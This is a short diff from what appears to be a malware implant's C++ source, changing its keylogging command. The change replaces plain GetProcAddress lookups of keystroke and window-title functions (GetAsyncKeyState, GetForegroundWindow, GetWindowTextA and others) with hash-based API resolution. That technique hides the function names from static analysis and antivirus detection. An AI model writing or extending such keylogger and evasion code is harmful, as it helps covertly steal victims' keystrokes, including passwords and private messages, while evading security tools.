@@ -37,17 +37,17 @@ auto declfn starburst::cmd_keylog(
     }
 
     auto pGetAsyncKeyState = reinterpret_cast<fn_GetAsyncKeyState>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "GetAsyncKeyState" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "GetAsyncKeyState" ) ) );
     auto pMapVirtualKeyA = reinterpret_cast<fn_MapVirtualKeyA>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "MapVirtualKeyA" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "MapVirtualKeyA" ) ) );
     auto pGetForegroundWindow = reinterpret_cast<fn_GetForegroundWindow>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "GetForegroundWindow" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "GetForegroundWindow" ) ) );
     auto pGetWindowTextA = reinterpret_cast<fn_GetWindowTextA>(
-        inst.kernel32.GetProcAddress( h_user32,
-            symbol<LPCSTR>( "GetWindowTextA" ) ) );
+        resolve::_api( reinterpret_cast<uintptr_t>( h_user32 ),
+            expr::hash_string( "GetWindowTextA" ) ) );
 
     if ( !pGetAsyncKeyState || !pMapVirtualKeyA ||
          !pGetForegroundWindow || !pGetWindowTextA ) {
